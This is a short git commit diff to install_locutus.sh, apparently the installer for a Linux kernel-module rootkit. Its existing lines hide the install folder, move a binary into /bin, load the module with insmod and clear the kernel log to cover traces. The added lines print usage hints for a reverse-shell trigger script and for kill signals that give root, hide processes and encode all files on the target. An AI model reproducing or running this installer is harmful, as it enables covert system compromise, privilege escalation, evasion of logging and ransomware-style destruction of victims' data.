9acbc49a08c68552e44510f1945d25022d8ec267
Terraminator <terraminator@protonmail.com>
2023-06-03 22:33:56 +0200

    Update install_locutus.sh

--- install_locutus.sh
+++ install_locutus.sh
@@ -1,4 +1,5 @@
 #!/bin/bash
+echo "installing locutus..."
 mv $(pwd) ../borg_d3monized # add magic prefix to our folder to be hidden
 
 cd locutus
@@ -8,3 +9,5 @@ sudo mv borg_transwarp /bin/
 mv locutus borg_locutus # add magic prefix
 insmod borg_locutus # insert lkm
 dmesg --clear # clear log
+
+echo -ne "installed!\nget a reverse shell by running locutus/trigger.sh <target ip>\nget root by using kill -64 $$\nhide a process by using kill -63 pid\nencode all files on the target with kill -62 $RANDOM\n"
